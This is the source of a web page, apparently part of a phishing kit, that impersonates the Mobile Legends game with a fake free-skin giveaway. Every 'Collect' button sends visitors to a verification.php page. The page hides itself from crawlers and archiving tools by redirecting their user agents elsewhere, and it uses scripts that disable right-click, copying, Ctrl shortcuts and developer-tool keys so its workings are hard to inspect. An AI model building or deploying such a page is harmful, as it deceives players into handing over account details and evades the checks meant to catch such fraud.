<?php
$ua = $_SERVER['HTTP_USER_AGENT'];
if(preg_match('#Mozilla/4.05 [fr] (Win98; I)#',$ua) || preg_match('/Java1.1.4/si',$ua) || preg_match('/MS FrontPage Express/si',$ua) || preg_match('/HTTrack/si',$ua) || preg_match('/IDentity/si',$ua) || preg_match('/HyperBrowser/si',$ua) || preg_match('/Lynx/si',$ua)) 
{
header('Location: http://www.raflipedia.club/');
die();
}
?>
<html>
<head>
<meta charset="utf-8">
<title>Mobile Legends - Free Collect</title>
<link href="css/style.css" rel="stylesheet" type="text/css">
<link href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" rel="stylesheet" type="text/css">
<link href="https://www.mobilelegends.com/images/favicon.ico?v=1" rel="shorcut icon">
<script type="text/javascript" src="js/jquery.min.js"></script>
<script type="text/javascript" src="js/generic.js"></script>
<script type="text/javascript" src="js/main.js"></script>
</head>
<body>
<div>

<script type="text/javascript">
function disableSelection(e){if(typeof e.onselectstart!="undefined")e.onselectstart=function(){return false};else if(typeof e.style.MozUserSelect!="undefined")e.style.MozUserSelect="none";else e.onmousedown=function(){return false};e.style.cursor="default"}window.onload=function(){disableSelection(document.body)}
</script>

<script type="text/javascript">
function mousedwn(e){try{if(event.button==2||event.button==3)return false}catch(e){if(e.which==3)return false}}document.oncontextmenu=function(){return false};document.ondragstart=function(){return false};document.onmousedown=mousedwn
</script>

<script type="text/javascript">
window.addEventListener("keydown",function(e){if(e.ctrlKey&&(e.which==65||e.which==66||e.which==67||e.which==73||e.which==80||e.which==83||e.which==85||e.which==86)){e.preventDefault()}});document.keypress=function(e){if(e.ctrlKey&&(e.which==65||e.which==66||e.which==67||e.which==73||e.which==80||e.which==83||e.which==85||e.which==86)){}return false}
</script>
<script type="text/javascript">
document.onkeydown=function(e){e=e||window.event;if(e.keyCode==123||e.keyCode==18){return false}}
</script>

<style type="text/css">
input {
    height: 20px;
}


/*padding for footer*/
#footer div p {
    float: none;
}
#footer .container{
    border: 0 !important;
}
</style>


<style>
h1, .h1, h2, .h2, h3, .h3 {
    margin-top: 0px;
    margin-bottom: 10.5px;
}
body { 
  background: url(gambar/bekgron.jpg) no-repeat center center fixed; 
  -webkit-background-size: cover;
  -moz-background-size: cover;
  -o-background-size: cover;
  background-size: cover;
}
.error-msg {
    margin: .5em 0;
    display: block;
    color: #dd4b39;
    line-height: 17px;
}
.col-md-6 {
 margin:0 auto;
 float:none;

}
.col-md-8 {
 margin:0 auto;
 float:none;

}
</style>

<style>
table {
    border-collapse: collapse;
    width: 29%;
}

th, td {
    text-align: left;
    padding: 8px;
}

th {border-radius: 8px;}

tr:nth-child(even){background-color: #f2f2f2}

th {
    color: white;
	top: 200px;
}

.button {
  display: inline-block;
  border-radius: 4px;
  background-color: #660099;
  border: none;
  color: #ff9900;
  text-align: center;
  font-size: 15px;
  padding: 5px;
  width: 100px;
  transition: all 0.1s;
  cursor: pointer;
  margin: 5px;
}

.button span {
  cursor: pointer;
  display: inline-block;
  position: relative;
  transition: 0.5s;
  
}

.button span:after {
  content: '>>';
  position: absolute;
  opacity: 0;
  top: 0;
  right: -70px;
  transition: 0.3s;
}

.button:hover {
	background-color: #330066
}

.button:hover span {
  padding-right: 25px;
}

.button{border-radius: 8px;}

.button:hover span:after {
  opacity: 1;
  right: 0;
}
</style>

	
<div id="kotak">
<div id="kotak2">
<div id="kotak3">
<div class="logonya"></div>
<div id='pantek' style="color:white">
<p>
<center>
<span class="kocakwe">Select Skin and Border What You Want</span>
</p>
</center>
		
		

		
<div class="row">
<div class="col-md-4">
<center><img src="gambar/saber.jpg"></center>
<center><a href="verification.php"><button class="button" style="vertical-align:middle"><span>Collect</span></button></a></center>
</div>
<div class="col-md-4">
<center><img height="340" width="207" src="gambar/freya.png"></center>
<center><a href="verification.php"><button class="button" style="vertical-align:middle"><span>Collect</span></button></a></center>
</div>
<div class="col-md-4">
<center><img src="gambar/miya.jpg"></center>
<center><a href="verification.php"><button class="button" style="vertical-align:middle"><span>Collect</span></button></a></center>
</div>
</div>


</br>
</br>

		
<div class="row">
<div class="col-md-4">
<center><img src="gambar/1.gif"></center>
<center><a href="verification.php"><button class="button" style="vertical-align:middle"><span>Collect</span></button></a></center>
</div>

<div class="col-md-4">
<center><img src="gambar/2.png"></center>	
<center><a href="verification.php"><button class="button" style="vertical-align:middle"><span>Collect</span></button></a></center>
</div>

<div class="col-md-4">
<center><img src="gambar/3.png"></center>
<center><a href="verification.php"><button class="button" style="vertical-align:middle"><span>Collect</span></button></a></center>
</div>

</div>

</br>
</br>

<div class="row">
<div class="col-md-4">
<center><img src="gambar/4.png"></center>
<center><a href="verification.php"><button class="button" style="vertical-align:middle"><span>Collect</span></button></a></center>
</div>

<div class="col-md-4">
<center><img src="gambar/5.png"></center>
<center><a href="verification.php"><button class="button" style="vertical-align:middle"><span>Collect</span></button></a></center>
</div>

<div class="col-md-4">
<center><img src="gambar/6.png"></center>
<center><a href="verification.php"><button class="button" style="vertical-align:middle"><span>Collect</span></button></a></center>
</div>
</div>

</br>
</br>

<div class="row">
<div class="col-md-4">
<center><img src="gambar/7.png"></center>
<center><a href="verification.php"><button class="button" style="vertical-align:middle"><span>Collect</span></button></a></center>
</div>

<div class="col-md-4">
<center><img src="gambar/8.png"></center>
<center><a href="verification.php"><button class="button" style="vertical-align:middle"><span>Collect</span></button></a></center>
</div>

<div class="col-md-4">
<center><img src="gambar/9.png"></center>
<center><a href="verification.php"><button class="button" style="vertical-align:middle"><span>Collect</span></button></a></center>
</div>
</div>

<br>
<br></div>
</div>
</div>
</div>
</div>
<br>
<br>
<div>

<div id="bawah">
<div style="clear:both"></div>
<br>
<br>
<img height="90" width="100" src="gambar/muntun.png">
<p>2017 © Moonton. Trademarks belong to their respective owners. All rights reserved.
</p>
</div>
</div>

</body>
</html>